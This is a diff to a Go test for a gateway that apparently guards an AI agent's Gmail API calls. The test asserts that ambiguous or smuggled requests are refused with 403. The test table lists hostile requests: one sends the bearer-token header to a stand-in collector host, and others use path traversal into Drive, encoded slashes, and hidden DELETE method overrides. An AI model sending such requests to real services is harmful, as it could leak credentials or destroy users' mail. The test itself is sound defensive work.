@@ -556,11 +556,14 @@ func TestARequestThatCouldBeReadTwoWaysIsRefused(t *testing.T) {
 	head := " HTTP/1.1\r\nHost: gmail.googleapis.com\r\nAuthorization: Bearer " + agenttool.Placeholder + "\r\n"
 
 	for name, request := range map[string]string{
-		"another address":    "GET https://collector.example/take" + head + "\r\n",
-		"a path that climbs": "GET /gmail/v1/users/me/messages/../../../../drive/v3/files" + head + "\r\n",
-		"a hidden slash":     "GET /gmail/v1/users/me/messages%2F1a2b%2Ftrash" + head + "\r\n",
-		"a method override":  "GET /gmail/v1/users/me/messages/1a2b" + head + "X-HTTP-Method-Override: DELETE\r\n\r\n",
-		"a method parameter": "GET /gmail/v1/users/me/messages/1a2b?$httpMethod=DELETE" + head + "\r\n",
+		"another address":              "GET https://collector.example/take" + head + "\r\n",
+		"a path that climbs":           "GET /gmail/v1/users/me/messages/../../../../drive/v3/files" + head + "\r\n",
+		"a hidden slash":               "GET /gmail/v1/users/me/messages%2F1a2b%2Ftrash" + head + "\r\n",
+		"a method override":            "GET /gmail/v1/users/me/messages/1a2b" + head + "X-HTTP-Method-Override: DELETE\r\n\r\n",
+		"a method parameter":           "GET /gmail/v1/users/me/messages/1a2b?$httpMethod=DELETE" + head + "\r\n",
+		"an empty override":            "GET /gmail/v1/users/me/messages/1a2b" + head + "X-HTTP-Method-Override:\r\n\r\n",
+		"a parameter in other letters": "GET /gmail/v1/users/me/messages/1a2b?%24HTTPMETHOD=DELETE" + head + "\r\n",
+		"a query split by a semicolon": "GET /gmail/v1/users/me/messages/1a2b?a=1;$httpMethod=DELETE" + head + "\r\n",
 	} {
 		got := gmail.raw(request)
 		assert.Equal(t, http.StatusForbidden, got.Status, name)
